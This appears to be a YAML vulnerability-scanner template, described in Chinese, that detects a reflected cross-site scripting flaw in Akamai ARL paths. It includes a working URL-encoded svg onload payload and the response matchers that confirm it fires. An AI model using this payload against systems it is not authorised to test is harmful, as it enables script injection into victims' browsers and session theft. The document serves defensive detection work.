id: akamai-arl-xss

info:
  name: Open Akamai ARL Cross Site Scripting 检测
  author: pdteam
  severity: high
  description: |
    该模板用于核查 Open Akamai ARL Cross Site Scripting相关配置。该类问题通常源于配置页面、错误页或管理接口将用户可控输入未编码写入响应，导致浏览器执行非预期脚本。模板会向目标发送探测请求，并依据请求 `/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(docu...`、匹配 `"><svg onload=confirm(document.domain)>`、`Suggestions for improving the results`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可诱导用户访问构造链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作或辅助钓鱼。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://github.com/war-and-code/akamai-arl-hack
    - https://twitter.com/SpiderSec/status/1421176297548435459
    - https://warandcode.com/post/akamai-arl-hack/
    - https://github.com/cybercdh/goarl
    - https://community.akamai.com/customers/s/article/WebPerformanceV1V2ARLChangeStartingFebruary282021?language=en_US
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79,CWE-83
  metadata:
    max-request: 1
  tags: akamai,xss,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        condition: and
        words:
          - '"><svg onload=confirm(document.domain)>'
          - 'Suggestions for improving the results'

      - type: word
        part: header
        words:
          - 'text/html'
